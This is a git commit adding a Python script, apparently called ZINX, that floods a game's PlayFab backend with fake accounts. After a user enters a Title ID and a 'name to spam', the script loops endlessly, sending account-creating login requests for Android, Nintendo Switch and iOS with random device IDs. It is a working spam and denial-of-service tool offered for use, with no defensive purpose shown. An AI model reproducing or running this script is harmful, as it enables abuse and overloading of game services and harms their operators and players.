0a56b950a51d27ddb472844edb0122ed749fd706
NotAtomz <92261290+NotAtomz@users.noreply.github.com>
2024-06-22 23:16:44 -0500

    Create main.py

---
+++ main.py
@@ -0,0 +1,124 @@
+import os
+import aiohttp
+import asyncio
+import json
+import uuid
+import concurrent.futures
+from colorama import init, Fore, Style
+import time
+
+def print_banner():
+  os.system('cls' if os.name == 'nt' else 'clear')
+  print(Fore.MAGENTA + '''    
+  ZZZZ   III  N   N  X    X 
+    Z     I   NN  N   X  X
+   Z      I   N N N    XX 
+  Z       I   N  NN   X  X
+  ZZZZ   III  N   N  x    x 
+    ''')
+Name = input("NAMETOSPAM:")
+
+init(autoreset=True)
+
+
+async def loginPlayfabAccount(session, url, payload, accountType, deviceId):
+  async with session.post(url, json=payload) as response:
+    print(f"Sent {accountType}: {deviceId}")
+    return response.status
+
+
+async def verifyTitleId(titleId):
+  async with aiohttp.ClientSession() as session:
+    custom_id = str(uuid.uuid4())
+
+    payload = {
+      "TitleId": titleId,
+      "CustomId": custom_id,
+      "CreateAccount": True,
+      "InfoRequestParameters": {
+        "GetUserAccountInfo": True
+      }
+    }
+
+    url = f"https://{titleId}.playfabapi.com/Client/LoginWithCustomID"
+
+    async with session.post(url, json=payload) as response:
+      if response.status == 200:
+        return True
+      else:
+        return False
+
+
+def getAccountTypeInfo(titleId, deviceId):
+  accountInfo = {
+    "android": {
+      "url":
+      f"https://{titleId}.playfabapi.com/Client/LoginWithAndroidDeviceID",
+      "payload": {
+        "TitleId": titleId,
+        "AndroidDeviceId": deviceId,
+        "CreateAccount": True,
+        "InfoRequestParameters": {
+          "GetUserAccountInfo": True
+        }
+      }
+    },
+    "nintendo": {
+      "url":
+      f"https://{titleId}.playfabapi.com/Client/LoginWithNintendoSwitchDeviceID",
+      "payload": {
+        "TitleId": titleId,
+        "NintendoSwitchDeviceId": Name,
+        "CreateAccount": True,
+        "InfoRequestParameters": {
+          "GetUserAccountInfo": True
+        }
+      }
+    },
+    "ios": {
+      "url": f"https://{titleId}.playfabapi.com/Client/LoginWithIOSDeviceID",
+      "payload": {
+        "TitleId": titleId,
+        "DeviceId": Name,
+        "CreateAccount": True,
+        "InfoRequestParameters": {
+          "GetUserAccountInfo": True
+        }
+      }
+    }
+  }
+  return [(accountType, info["url"], info["payload"])
+          for accountType, info in accountInfo.items()]
+
+
+async def main():
+  print_banner()
+  titleId = input(Fore.RED + "Title ID: " + Style.RESET_ALL)
+
+  while True:
+    is_valid = await verifyTitleId(titleId)
+    if is_valid:
+      async with aiohttp.ClientSession() as session:
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+          loop = asyncio.get_event_loop()
+          while True:
+            deviceId = str(uuid.uuid4())
+            tasks = [
+              loop.create_task(
+                loginPlayfabAccount(session, url, payload, accountType,
+                                    deviceId))
+              for accountType, url, payload in getAccountTypeInfo(
+                titleId, deviceId)
+            ]
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(0)
+    else:
+      print(Fore.YELLOW + "Invalid Title ID.")
+      time.sleep(2)
+      print_banner()
+      titleId = input(Fore.RED + "Title ID: " + Style.RESET_ALL)
+
+
+if __name__ == '__main__':
+  loop = asyncio.get_event_loop()
+  loop.run_until_complete(main())
